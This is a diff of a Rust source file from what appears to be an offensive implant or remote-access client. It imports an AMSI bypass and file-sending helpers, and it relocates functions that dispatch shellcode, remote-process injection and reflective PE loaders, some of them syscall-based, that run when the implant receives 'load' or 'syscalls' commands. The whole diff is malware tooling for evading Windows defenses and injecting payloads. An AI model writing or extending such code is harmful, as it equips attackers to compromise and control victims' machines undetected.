@@ -1,9 +1,6 @@
 use crate::amsi_bypass::{patch_amsi, start_process_thread};
-use crate::loader::{reflective_loader, remote_loader, shellcode_loader};
-use crate::loader_syscalls::{
-    reflective_loader_syscalls, remote_loader_syscalls, shellcode_loader_syscalls,
-};
 use crate::utils::tools::{read_and_send_file, receive_and_write_bytes};
+use crate::utils::tools_windows::{call_loader_pe, call_loader_shellcode};
 
 use std::error::Error;
 use std::fs::File;
@@ -27,71 +24,6 @@ fn do_stuff(cmd: &str) -> Vec<u8> {
     } else {
         return _stdr.to_vec();
     }
-}
-
-fn call_loader_shellcode(
-    shellcode_to_load: Vec<u8>,
-    pe_to_exec: &str,
-    loader: u8,
-) -> Result<(), Box<dyn Error>> {
-    match loader {
-        0 => match shellcode_loader_syscalls(shellcode_to_load, pe_to_exec) {
-            Ok(rl) => rl,
-            Err(_) => {
-                return Err("Shellcode loading error".into());
-            }
-        },
-        1 => match shellcode_loader(shellcode_to_load, pe_to_exec) {
-            Ok(rl) => rl,
-            Err(_) => {
-                return Err("Shellcode loading error".into());
-            }
-        },
-        _ => log::debug!("Invalid loader ID"),
-    }
-    Ok(())
-}
-
-fn call_loader_pe(file_to_load: &str, pe_to_exec: &str, loader: u8) -> Result<(), Box<dyn Error>> {
-    let mut buf: Vec<u8> = Vec::new();
-    let file = File::open(file_to_load.trim().replace("\\\\", "\\"));
-    match file {
-        Ok(mut f) => {
-            f.read_to_end(&mut buf)?;
-            match loader {
-                0 => match remote_loader(buf, pe_to_exec) {
-                    Ok(rl) => rl,
-                    Err(_) => {
-                        return Err("PE loading error".into());
-                    }
-                },
-                1 => match remote_loader_syscalls(buf, pe_to_exec) {
-                    Ok(rl) => rl,
-                    Err(_) => {
-                        return Err("PE loading error".into());
-                    }
-                },
-                2 => match reflective_loader(buf) {
-                    Ok(rl) => rl,
-                    Err(_) => {
-                        return Err("PE loading error".into());
-                    }
-                },
-                3 => match reflective_loader_syscalls(buf) {
-                    Ok(rl) => rl,
-                    Err(_) => {
-                        return Err("PE loading error".into());
-                    }
-                },
-                _ => log::debug!("Invalid loader ID"),
-            }
-        }
-        Err(_) => {
-            return Err("Error openning file to load".into());
-        }
-    };
-
-    Ok(())
 }
 
 pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
@@ -289,10 +221,10 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
             }
         } else if String::from_utf8_lossy(&buff)
             .trim_end_matches('\0')
-            .starts_with("load")
+            .starts_with("load ")
             || String::from_utf8_lossy(&buff)
                 .trim_end_matches('\0')
-                .starts_with("syscalls")
+                .starts_with("syscalls ")
         {
             let tmp = "".to_owned();
             let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
